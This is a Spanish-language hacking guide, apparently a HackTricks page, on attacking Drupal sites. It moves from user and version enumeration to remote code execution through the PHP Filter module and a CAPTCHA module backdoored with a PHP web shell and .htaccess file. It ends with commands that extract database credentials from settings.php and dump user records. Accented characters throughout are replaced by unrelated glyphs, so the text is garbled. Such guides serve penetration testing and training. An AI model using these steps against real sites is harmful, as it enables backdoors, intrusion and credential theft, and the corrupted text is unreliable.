# Drupal

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Descubrimiento

* Verifica **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupal **indexa su contenido usando nodos**. Un nodo puede **contener cualquier cosa** como una entrada de blog, encuesta, art칤culo, etc. Las URI de las p치ginas suelen tener la forma `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Enumeraci칩n

Drupal soporta **tres tipos de usuarios** por defecto:

1. **`Administrator`**: Este usuario tiene control completo sobre el sitio web de Drupal.
2. **`Authenticated User`**: Estos usuarios pueden iniciar sesi칩n en el sitio web y realizar operaciones como a침adir y editar art칤culos basados en sus permisos.
3. **`Anonymous`**: Todos los visitantes del sitio web son designados como an칩nimos. Por defecto, a estos usuarios solo se les permite leer publicaciones.

### Versi칩n

* Verificar `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Las instalaciones m치s recientes de Drupal por defecto bloquean el acceso a los archivos `CHANGELOG.txt` y `README.txt`.
{% endhint %}

### Enumeraci칩n de nombres de usuario

#### Registro

En _/user/register_ solo intenta crear un nombre de usuario y si el nombre ya est치 tomado se notificar치:

![](<../../.gitbook/assets/image (254).png>)

#### Solicitar nueva contrase침a

Si solicitas una nueva contrase침a para un nombre de usuario existente:

![](<../../.gitbook/assets/image (255).png>)

Si solicitas una nueva contrase침a para un nombre de usuario inexistente:

![](<../../.gitbook/assets/image (256).png>)

### Obtener n칰mero de usuarios

Accediendo a _/user/\<number>_ puedes ver el n칰mero de usuarios existentes, en este caso es 2 ya que _/users/3_ devuelve un error de no encontrado:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### P치ginas ocultas

**Fuzz `/node/$` donde `$` es un n칰mero** (de 1 a 500 por ejemplo).\
Podr칤as encontrar **p치ginas ocultas** (test, dev) que no est치n referenciadas por los motores de b칰squeda.

#### Informaci칩n de m칩dulos instalados
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Autom치tico
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Con el M칩dulo PHP Filter

{% hint style="warning" %}
En versiones anteriores de Drupal **(antes de la versi칩n 8)**, era posible iniciar sesi칩n como administrador y **habilitar el m칩dulo `PHP filter`**, que "Permite que se eval칰en fragmentos/c칩digos PHP incrustados."
{% endhint %}

Necesitas que el **plugin php est칠 instalado** (compru칠balo accediendo a _/modules/php_ y si devuelve un **403** entonces, **existe**, si **no se encuentra**, entonces el **plugin php no est치 instalado**)

Ve a _Modules_ -> (**Marca**) _PHP Filter_ -> _Guardar configuraci칩n_

![](<../../.gitbook/assets/image (247) (1).png>)

Luego haz clic en _A침adir contenido_ -> Selecciona _P치gina b치sica_ o _Art칤culo_ -> Escribe _shellcode php en el cuerpo_ -> Selecciona _C칩digo PHP_ en _Formato de texto_ -> Selecciona _Vista previa_

![](<../../.gitbook/assets/image (253) (1).png>)

Finalmente, solo accede al nodo reci칠n creado:
```bash
curl http://drupal-site.local/node/3
```
### Instalar el M칩dulo PHP Filter

A partir de la versi칩n **8 en adelante, el** [**m칩dulo PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **no est치 instalado por defecto**. Para aprovechar esta funcionalidad, tendr칤amos que **instalar el m칩dulo nosotros mismos**.

1. Descarga la versi칩n m치s reciente del m칩dulo desde el sitio web de Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una vez descargado, ve a **`Administraci칩n`** > **`Informes`** > **`Actualizaciones disponibles`**.
3. Haz clic en **`Examinar`**`,` selecciona el archivo desde el directorio donde lo descargamos y luego haz clic en **`Instalar`**.
4. Una vez instalado el m칩dulo, podemos hacer clic en **`Contenido`** y **crear una nueva p치gina b치sica**, de manera similar a como lo hicimos en el ejemplo de Drupal 7. De nuevo, aseg칰rate de **seleccionar `C칩digo PHP` del desplegable `Formato de texto`**.

### M칩dulo con puerta trasera

Se puede crear un m칩dulo con puerta trasera **a침adiendo un shell a un m칩dulo existente**. Los m칩dulos se pueden encontrar en el sitio web drupal.org. Escojamos un m칩dulo como [CAPTCHA](https://www.drupal.org/project/captcha). Despl치zate hacia abajo y copia el enlace para el archivo tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Descarga el archivo y extrae su contenido.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crea una **PHP web shell** con el contenido:
```php
<?php
system($_GET["cmd"]);
?>
```
* A continuaci칩n, necesitamos crear un archivo **`.htaccess`** para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuraci칩n anterior aplicar치 reglas para la carpeta / cuando solicitemos un archivo en /modules. Copia ambos archivos a la carpeta captcha y crea un archivo.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Suponiendo que tenemos **acceso administrativo** al sitio web, haz clic en **`Manage`** y luego en **`Extend`** en la barra lateral. A continuaci칩n, haz clic en el bot칩n **`+ Install new module`** y seremos llevados a la p치gina de instalaci칩n, como `http://drupal-site.local/admin/modules/install` Navega hasta el archivo comprimido del Captcha con puerta trasera y haz clic en **`Install`**.
* Una vez que la instalaci칩n tenga 칠xito, navega a **`/modules/captcha/shell.php`** para ejecutar comandos.

## Post Explotaci칩n

### Leer settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Volcar usuarios de la DB
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Referencias

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>Aprende a hackear AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
